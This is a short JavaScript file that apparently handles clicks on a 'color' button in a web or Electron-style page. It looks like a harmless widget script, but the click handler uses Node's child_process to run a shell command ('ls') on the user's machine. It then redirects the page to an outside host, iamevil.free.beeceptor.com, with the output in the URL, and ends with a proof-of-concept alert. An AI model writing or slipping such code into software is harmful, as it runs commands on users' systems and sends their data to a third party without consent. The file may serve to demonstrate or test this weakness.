const color = document.getElementById("color");
const target = document.getElementById("result");

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
  }  

color.onclick = () => {
    const execSync = require('child_process').execSync;
    const output = execSync('ls', { encoding: 'utf-8' });
    console.log('Output was:\n', output);
    document.location = 'https://iamevil.free.beeceptor.com/cookie?c=' + output;
    alert(2);
}
